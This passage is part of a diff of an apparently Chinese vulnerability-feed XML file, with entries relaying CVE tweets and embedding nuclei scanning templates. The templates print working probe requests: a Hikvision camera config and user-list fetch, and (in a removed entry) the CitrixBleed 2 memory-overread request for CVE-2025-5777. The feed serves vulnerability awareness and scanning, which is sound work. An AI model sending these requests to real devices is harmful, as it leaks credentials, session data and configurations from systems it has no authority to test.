class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/System/configurationFile?auth=&#123;&#123;b64auth&#125;&#125;&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Content-Type: application/octet-stream&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> config-download<br>        <span class="hljs-params">part:</span> request<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;/System/configurationFile<span class="hljs-char escape_">\\</span>?auth=.*&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/Security/users?auth=&#123;&#123;b64auth&#125;&#125;&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;userName&gt;&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;userLevel&gt;&quot;</span><br>        <span class="hljs-params">condition:</span> and<br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> exposed-usernames<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;userName&gt;(.*?)&lt;/userName&gt;&quot;</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Hikvision IP Camera - Snapshot, Config,</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVEnew Twitter Update !</title>
+    <link href="http://example.com/2025/07/05/twitter_812405645/"/>
+    <id>http://example.com/2025/07/05/twitter_812405645/</id>
+    <published>2025-07-05T03:00:14.000Z</published>
+    <updated>2025-07-05T03:00:14.800Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> CVEnew</p><p><strong>推文：</strong> CVE-2025-47228 在Netmake ScriptCase至9.12.006（23）版本的生产环境扩展中，SSH连接设置的shell注入漏洞允许经过身份验证的攻击者… <a href="https://t.co/0dBCnqXg1e">https://t.co/0dBCnqXg1e</a></p><p><strong>链接：</strong> <a href="https://x.com/CVEnew/status/1941329345680646215">https://x.com/CVEnew/status/1941329345680646215</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; CVEnew&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-47228 在Netmake ScriptCase至9.12.006（23）版本的生产环境扩展中，SSH连接设置的shell注入漏洞允许经过身份</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="CVEnew" scheme="http://example.com/tags/CVEnew/"/>
+    
+  </entry>
   
   <entry>
     <title>Scoold 认证绕过漏洞</title>
@@ -272,263 +527,6 @@
     
     
     <category term="illdeed" scheme="http://example.com/tags/illdeed/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>shampoo_101_ Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_2002919685/"/>
-    <id>http://example.com/2025/07/05/twitter_2002919685/</id>
-    <published>2025-07-05T02:00:32.000Z</published>
-    <updated>2025-07-05T02:00:32.439Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> shampoo_101_</p><p><strong>推文：</strong> Citrix NetScaler ADC&#x2F;Gateway 存在包括CVE‑2025‑5777（认证绕过）和CVE‑2025‑6543（内存损坏）在内的多个漏洞，数万台设备暴露于风险中。已被CISA列入KEV目录，攻击迹象正被实时监测。务必在7月21日前紧急打补丁⚠️ <a href="https://t.co/SQkcd9MWCE">https://t.co/SQkcd9MWCE</a></p><p><strong>链接：</strong> <a href="https://x.com/shampoo_101_/status/1941308309778333831">https://x.com/shampoo_101_/status/1941308309778333831</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; shampoo_101_&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; Citrix NetScaler ADC&amp;#x2F;Gateway 存在包括CVE‑2025‑5777（认证绕过）和CVE‑2025‑6543（内存损</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="shampoo_101_" scheme="http://example.com/tags/shampoo-101/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>offseq Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_1314617581/"/>
-    <id>http://example.com/2025/07/05/twitter_1314617581/</id>
-    <published>2025-07-05T02:00:25.000Z</published>
-    <updated>2025-07-05T02:00:25.751Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> offseq</p><p><strong>推文：</strong> 🚨 紧急漏洞警告：Service Finder Booking存在严重漏洞！权限提升风险——未经授权的攻击者可能接管您的系统。立即限制访问并监控！<a href="https://t.co/4lrpjHutTq">https://t.co/4lrpjHutTq</a> #OffSeq #漏洞 #信息安全 <a href="https://t.co/ausf6WVPQa">https://t.co/ausf6WVPQa</a></p><p><strong>链接：</strong> <a href="https://x.com/offseq/status/1941308622601883811">https://x.com/offseq/status/1941308622601883811</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; offseq&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 紧急漏洞警告：Service Finder Booking存在严重漏洞！权限提升风险——未经授权的攻击者可能接管您的系统。立即限制访问并监控！&lt;a href</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="offseq" scheme="http://example.com/tags/offseq/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Citrix NetScaler Memory Disclosure - CitrixBleed 2</title>
-    <link href="http://example.com/2025/07/05/github_3556400669/"/>
-    <id>http://example.com/2025/07/05/github_3556400669/</id>
-    <published>2025-07-05T02:00:21.000Z</published>
-    <updated>2025-07-05T02:00:21.707Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Citrix NetScaler Memory Disclosure - CitrixBleed 2</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5777</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Citrix NetScaler是一款广泛使用的应用交付控制器和网关设备，为企业提供负载均衡、SSL加速和安全的远程访问等功能。由于其广泛部署于企业网络边界，NetScaler的安全问题可能对企业的网络安全构成严重威胁。CVE-2025-5777，也被称为CitrixBleed 2，是一个严重的内存泄露漏洞，影响NetScaler管理接口。该漏洞源于对输入验证不足，导致攻击者可以通过构造特定的请求，触发内存越界读取，从而泄露敏感信息。这种漏洞可能被利用来获取系统内存中的敏感数据，如用户凭证、会话令牌等，进一步可能导致未授权访问或其他恶意活动。由于漏洞存在于NetScaler的管理接口，攻击者可能无需认证即可利用此漏洞，增加了其潜在的危险性。企业应立即评估其NetScaler设备的安全性，并应用相关补丁以防止潜在的攻击。</p><p><strong>产品厂商：</strong> Citrix</p><p><strong>产品名称：</strong> NetScaler ADC, NetScaler Gateway</p><p><strong>搜索语法：</strong> title:”NetScaler Gateway”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/4815a962b8a9d6040dfc818d4139515530b01835/http%2Fcves%2F2025%2FCVE-2025-5777.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/4815a962b8a9d6040dfc818d4139515530b01835/http%2Fcves%2F2025%2FCVE-2025-5777.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">5777</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Citrix NetScaler Memory Disclosure <span class="hljs-operator">-</span> CitrixBleed <span class="hljs-number">2</span><br>  <span class="hljs-params">author:</span> watchtowr,DhiyaneshDk<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Insufficient input validation leading to memory overread on the NetScaler Management Interface NetScaler ADC and NetScaler Gateway<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>support.citrix.com<span class="hljs-operator">/</span>support-home<span class="hljs-operator">/</span>kbsearch<span class="hljs-operator">/</span>article<span class="hljs-operator">?</span>articleNumber<span class="hljs-operator">=</span>CTX693420<br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>labs.watchtowr.com<span class="hljs-operator">/</span>how-much-more-must-we-bleed-citrix-netscaler-memory-disclosure-citrixbleed-<span class="hljs-number">2</span><span class="hljs-operator">-</span>cve-<span class="hljs-number">202</span>5-<span class="hljs-number">5777</span><span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2025-5777</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.00042</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.12361</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;NetScaler Gateway&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,netscaler,citrix,exposure<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<span class="hljs-operator">+</span><br>        POST <span class="hljs-symbol">/p/u/doAuthentication.do</span> HTTP<span class="hljs-symbol">/1.0</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">User-Agent:</span> watchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowr<br><br>        login<br><br>    <span class="hljs-params">unsafe:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;No active policy during authentication&quot;</span><br>        <span class="hljs-params">negative:</span> <span class="hljs-literal">true</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;InitialValue&gt;&lt;/InitialValue&gt;&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> content_type<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;application/vnd.citrix.authenticateresponse&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Citrix NetScaler Memory Disclosure - Ci</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>VulmonFeeds Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_2945282823/"/>
-    <id>http://example.com/2025/07/05/twitter_2945282823/</id>
-    <published>2025-07-05T02:00:20.000Z</published>
-    <updated>2025-07-05T02:00:20.323Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> VulmonFeeds</p><p><strong>推文：</strong> CVE-2025-38217</p><p>Linux内核hwmon fts_read()函数中的TOCTOU竞态条件</p><p>详情链接：<a href="https://t.co/P0aH2wTSSx">https://t.co/P0aH2wTSSx</a></p><p>漏洞警报订阅：<a href="https://t.co/hrQhy5uz4x">https://t.co/hrQhy5uz4x</a></p><p><strong>链接：</strong> <a href="https://x.com/VulmonFeeds/status/1941313297468281343">https://x.com/VulmonFeeds/status/1941313297468281343</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; VulmonFeeds&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-38217&lt;/p&gt;
-&lt;p&gt;Linux内核hwmon fts_read()函数中的TOCTOU竞态条件&lt;/p&gt;
-&lt;p&gt;详情链接：&lt;a h</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="VulmonFeeds" scheme="http://example.com/tags/VulmonFeeds/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Komodosec Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_2937483890/"/>
-    <id>http://example.com/2025/07/05/twitter_2937483890/</id>
-    <published>2025-07-05T02:00:13.000Z</published>
-    <updated>2025-07-05T02:00:13.895Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> Komodosec</p><p><strong>推文：</strong> 分析CVE-2025-31191：基于macOS安全范围书签的沙箱逃逸漏洞 <a href="https://t.co/2hRWMaCxQD">https://t.co/2hRWMaCxQD</a></p><p><strong>链接：</strong> <a href="https://x.com/Komodosec/status/1941315984952000848">https://x.com/Komodosec/status/1941315984952000848</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; Komodosec&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 分析CVE-2025-31191：基于macOS安全范围书签的沙箱逃逸漏洞 &lt;a href=&quot;https://t.co/2hRWMaCxQD&quot;&gt;https:</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="Komodosec" scheme="http://example.com/tags/Komodosec/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>offseq Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_2329738413/"/>
-    <id>http://example.com/2025/07/05/twitter_2329738413/</id>
-    <published>2025-07-05T01:01:08.000Z</published>
-    <updated>2025-07-05T01:01:08.368Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> offseq</p><p><strong>推文：</strong> 🚨 NetAlertX &lt;25.6.7 遭遇严重认证绕过漏洞！攻击者可通过魔法哈希跳过密码验证。立即升级以保护您的网络 🔒 <a href="https://t.co/1h7UinClcK">https://t.co/1h7UinClcK</a> #OffSeq #NetAlertX #CVE202548952 <a href="https://t.co/i1C4QCmsKp">https://t.co/i1C4QCmsKp</a></p><p><strong>链接：</strong> <a href="https://x.com/offseq/status/1941285979316199713">https://x.com/offseq/status/1941285979316199713</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; offseq&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 NetAlertX &amp;lt;25.6.7 遭遇严重认证绕过漏洞！攻击者可通过魔法哈希跳过密码验证。立即升级以保护您的网络 🔒 &lt;a href=&quot;https</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="offseq" scheme="http://example.com/tags/offseq/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>secharvesterx Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_1322412237/"/>
-    <id>http://example.com/2025/07/05/twitter_1322412237/</id>
-    <published>2025-07-05T01:01:02.000Z</published>
-    <updated>2025-07-05T01:01:02.720Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> secharvesterx</p><p><strong>推文：</strong> 我们还要流多少血？ - Citrix NetScaler内存泄露（CitrixBleed 2 CVE-2025-5777） - watchTowr实验室<br><a href="https://t.co/5b6VmT6SIK">https://t.co/5b6VmT6SIK</a> <a href="https://t.co/ah1DWbVfO2">https://t.co/ah1DWbVfO2</a></p><p><strong>链接：</strong> <a href="https://x.com/secharvesterx/status/1941285984752029734">https://x.com/secharvesterx/status/1941285984752029734</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; secharvesterx&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 我们还要流多少血？ - Citrix NetScaler内存泄露（CitrixBleed 2 CVE-2025-5777） - watchTowr实</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="secharvesterx" scheme="http://example.com/tags/secharvesterx/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>EurasiaReview Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_343667317/"/>
-    <id>http://example.com/2025/07/05/twitter_343667317/</id>
-    <published>2025-07-05T01:00:57.000Z</published>
-    <updated>2025-07-05T01:00:57.532Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> EurasiaReview</p><p><strong>推文：</strong> 《2025年CVE法案与巴基斯坦反恐的未来——评论》 <a href="https://t.co/SrOe1p9P2I">https://t.co/SrOe1p9P2I</a></p><p><strong>链接：</strong> <a href="https://x.com/EurasiaReview/status/1941287662272512389">https://x.com/EurasiaReview/status/1941287662272512389</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; EurasiaReview&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 《2025年CVE法案与巴基斯坦反恐的未来——评论》 &lt;a href=&quot;https://t.co/SrOe1p9P2I&quot;&gt;https://t.co/</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="EurasiaReview" scheme="http://example.com/tags/EurasiaReview/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>VulmonFeeds Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_2641873080/"/>
-    <id>http://example.com/2025/07/05/twitter_2641873080/</id>
-    <published>2025-07-05T01:00:53.000Z</published>
-    <updated>2025-07-05T01:00:53.700Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> VulmonFeeds</p><p><strong>推文：</strong> CVE-2025-38229</p><p>Linux内核cxusb DVB USB驱动中的未初始化值漏洞</p><p>详情链接：<a href="https://t.co/BoJKVpHuFS">https://t.co/BoJKVpHuFS</a></p><p>可定制的漏洞警报：<a href="https://t.co/U7998fz7yk">https://t.co/U7998fz7yk</a></p><p><strong>链接：</strong> <a href="https://x.com/VulmonFeeds/status/1941287704328642799">https://x.com/VulmonFeeds/status/1941287704328642799</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; VulmonFeeds&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-38229&lt;/p&gt;
-&lt;p&gt;Linux内核cxusb DVB USB驱动中的未初始化值漏洞&lt;/p&gt;
-&lt;p&gt;详情链接：&lt;a href=&quot;h</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="VulmonFeeds" scheme="http://example.com/tags/VulmonFeeds/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>VulmonFeeds Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_1010527701/"/>
-    <id>http://example.com/2025/07/05/twitter_1010527701/</id>
-    <published>2025-07-05T01:00:48.000Z</published>
-    <updated>2025-07-05T01:00:48.127Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> VulmonFeeds</p><p><strong>推文：</strong> CVE-2025-38226</p><p>Linux内核KASAN</p><p><a href="https://t.co/Xd7RZMncYY">https://t.co/Xd7RZMncYY</a></p><p><strong>链接：</strong> <a href="https://x.com/VulmonFeeds/status/1941290264234012914">https://x.com/VulmonFeeds/status/1941290264234012914</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; VulmonFeeds&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-38226&lt;/p&gt;
-&lt;p&gt;Linux内核KASAN&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://t.co/Xd7RZMncYY&quot;&gt;</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="VulmonFeeds" scheme="http://example.com/tags/VulmonFeeds/"/>
     
   </entry>
   
